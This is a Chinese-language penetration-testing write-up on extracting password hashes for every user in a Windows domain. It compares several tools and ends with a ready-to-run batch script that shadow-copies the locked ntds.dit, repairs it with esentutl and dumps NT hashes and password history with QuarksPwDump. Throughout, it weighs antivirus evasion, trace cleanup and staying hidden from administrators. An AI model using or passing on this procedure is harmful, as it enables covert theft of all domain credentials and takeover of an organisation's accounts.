# 导出当前域内所有用户hash的技术整理

0x00目标：
=======

* * *

导出当前域内所有用户的hash

0x01测试环境：
=========

* * *

```
域控：server2008 r2
杀毒软件：已安装*
域控权限：可使用net use远程登陆，不使用3389

```

0x02测试方法：
=========

* * *

（1）mimikatz：

```
hash数量：只能抓取登陆过的用户hash，无法抓取所有用户
免杀：需要免杀

```

（2）pwdump：

```
hash数量：无法抓取所有用户
免杀：需要免杀

```

（3）vssown.vbs + libesedb + NtdsXtract

```
hash数量：所有用户
免杀：不需要
优点：
    获得信息很全面，可获得以下信息：
    Record ID
    User name
    User principal name
    SAM Account name
    SAM Account type
    GUID
    SID
    When created
    When changed
    Account expires
    Password last set
    Last logon
    Last logon timestamp
    Bad password time
    Logon count
    Bad password count
    User Account Control
    Ancestors
    Password hashes
    Password history
    Supplemental credentials
    Member of

缺点：
    vssown.vbs使用后需要删除快照清理痕迹
    vssown.vbs偶尔会报错
    数据库巨大，下载回本地很麻烦
    libesedb + NtdsXtract环境搭建麻烦，目前网上中文的教程存在一些错误，下载链接也已失效，需要自行摸索
    用vssown.vbs复制出来的ntds.dit数据库无法使用QuarksPwDump.exe读取       

```

* * *

**_Tips:_**  
libesedb + NtdsXtract环境搭建的一点提示：

```
(download libesedb)
https://github.com/libyal/libesedb/releases/download/20150409/libesedb-experimental-20150409.tar.gz
tar zxvf libesedb-experimental-20150409.tar.gz
cd libesedb-20150409
./configure
make
cd esedbtools/
./esedbexport
(copy ntds.dit to ~/libesedb-20150409/esedbtools)
./esedbexport ./ntds.dit
(wait...)
mv ntds.dit.export/ ../../
（download ntdsxtract）
http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
unzip ntdsxtract_v1_0.zip
cd NTDSXtract 1.0/
(move SYSTEM to '/root/SYSTEM')
(get passwordhashes )
python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes '/root/SYSTEM'

```

* * *

（4）ntdsutil.exe + QuarksPwDump.exe

```
hash数量：所有用户 
免杀：QuarksPwDump.exe需要免杀 
优点： 
    获得信息很全面 QuarksPwDump.exe可在windows下使用，读取hash值的操作简便快捷
缺点： 
    ntdsutil.exe使用后需要删除快照清理痕迹 ntdsutil.exe偶尔会报错 巨大的数据库，QuarksPwDump.exe读取偶尔会报错 server2003的shell下无法使用

```

0x03实际测试：
=========

* * *

*   gethashes.exe：没有源码，忽略
*   mimikatz：无法抓出所有用户hash，本机管理员口令也无法导出
*   pwdump：抓取数量不足
*   vssown.vbs + libesedb + NtdsXtract：成功，耗时3天+
*   ntdsutil.exe + QuarksPwDump.exe：ntdsutil.exe报错，失败

0x04分析：
=======

* * *

5种方法唯一成功的是`vssown.vbs + libesedb + NtdsXtract`，但是耗时太久，操作麻烦，下载数据库容易暴露，`vssown.vbs`备份的信息容易被管理员发现

其他方法中可取的地方：`vssown.vbs`复制数据库的方法很是巧妙，但存在一些不足，配合域控的at命令执行较为麻烦；QuarksPwDump.exe可在windows下直接使用，免去读取数据库的等待，并且`QuarksPwDump`可获得源码，能够配合实际使用做修改。

那么大胆设想一下：如果使用`QuarksPwDump.exe`在域控上直接读取`ntds.dit`岂不是最好

0x05改进：
=======

* * *

（1）分析`vssown.vbs`的复制办法，找到一种更好的解决办法，改用`ShadowCopy`实现`ntds.dit`的复制 （2）对`QuarksPwDump`的改造，实现命令行下的自动读取及导出信息

* * *

**_Tips：_**

```
ShadowCopy 是一款增强型的免费文件复制工具，由于使用了微软卷影副本（`Volume Shadow Copy`）技术，它能够复制被锁定的文件或者被其他程序打开的文件，

因此只要是硬盘的上的文件，即使正被程序占用，`ShadowCopy` 都可以拷贝出来。

```

0x06最终方案：
=========

* * *

（1）使用ShadowCopy的命令行版，编写bat实现拷贝ntds.dit至当前目录

```
setlocal
if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER=%SystemDrive%
set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit
set DESTINATION_PATH=%~dp0
@echo ...Determine the scripts to be executed/generated...
set CALLBACK_SCRIPT=%~dpnx0
set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
"%~dp0vsshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
del /f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%

```

参考链接： http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx

（2）使用QuarksPwDump直接读取信息并将结果导出至文件，先执行

```
esentutl /p /o ntds.dit

```

修复复制出来的数据库

```
QuarksPwDump.exe -dhb -hist -nt ntds.dit -o log.txt

```

读取并导出。

注：实际使用时ntds.dit和log.txt需要加绝对路径

* * *

**_Tips：_**

```
QuarksPwDump.exe：Dump various types of Windows credentials without injecting in any process.
源码下载链接，vs2010直接编译即可
https://github.com/quarkslab/quarkspwdump

```

0x07小结：
=======

* * *

ShadowCopy+QuarksPwDump：

```
hash数量：所有用户
免杀：不需要
优点：
    获得信息全面
    bat一键搞定，简单高效
    无需下载ntds.dit，隐蔽性高
```